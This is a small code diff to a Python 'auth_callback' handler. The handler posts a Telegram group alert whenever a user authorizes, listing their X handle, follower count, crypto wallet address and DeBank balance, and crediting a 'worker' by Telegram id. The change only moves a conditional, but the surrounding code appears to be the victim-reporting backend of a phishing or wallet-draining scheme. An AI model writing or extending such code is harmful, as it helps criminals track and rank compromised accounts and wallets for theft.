@@ -191,11 +191,11 @@ def auth_callback():
 
         worker_id = worker["user_id"]
 
-        worker_line = f"👷 *Worker*: [{worker_id}](tg://user?id={worker_id})\n\n"
+        worker_line = f"👷 *Worker*: [{worker_id}](tg://user?id={worker_id})\n\n" if owner_id != worker_id else "\n"
 
         message = (f'🐍 *User [{parse(username)}](https://x.com/{username}) has authorized\\.*\n'
                    f'👥 *Followers:* {parse(followers)}\n'
-                   f'{worker_line if owner_id != worker_id else "\n"}'
+                   f'{worker_line}'
                    f'🔗 *[{address}](https://debank.com/profile/{address})* \\| $*_{parse(balance)}_*')
 
         send_message(group_id, message)
